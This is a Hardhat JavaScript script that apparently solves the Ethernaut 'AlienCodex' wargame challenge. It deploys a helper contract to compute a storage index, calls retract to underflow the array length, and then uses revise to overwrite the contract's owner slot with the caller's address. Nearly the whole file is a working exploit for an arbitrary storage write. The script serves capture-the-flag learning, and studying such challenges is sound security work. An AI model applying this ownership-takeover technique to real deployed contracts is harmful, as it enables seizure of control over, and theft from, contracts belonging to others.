const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

    const AlienCodex = await ethers.getContractFactory("AlienCodex");
    const contract = AlienCodex.attach(instance_address);

    // Deploy Calc
    const Calc = await ethers.getContractFactory("Calc");
    const calc = await  Calc.deploy();
    await calc.deployed();

    const index = await calc.getIndex();
    console.log(`Index of owner is ${index}`);

    console.log(`Owner: ${await contract.owner()}`);

    console.log('Making contact...');
    let tx = await contract.make_contact();
    await tx.wait(5);

    console.log('Calling retract...')
    tx = await contract.retract();
    await tx.wait(5);

    console.log('Pushing data...')
    tx = await contract.revise(index, ethers.utils.hexZeroPad(account.address, 32));
    await tx.wait(5);

    console.log(`Owner: ${await contract.owner()}`);

    console.log('Success!')

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0x9A2C7046fF540B246FbEb9c87efc7f54cA3887cF';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
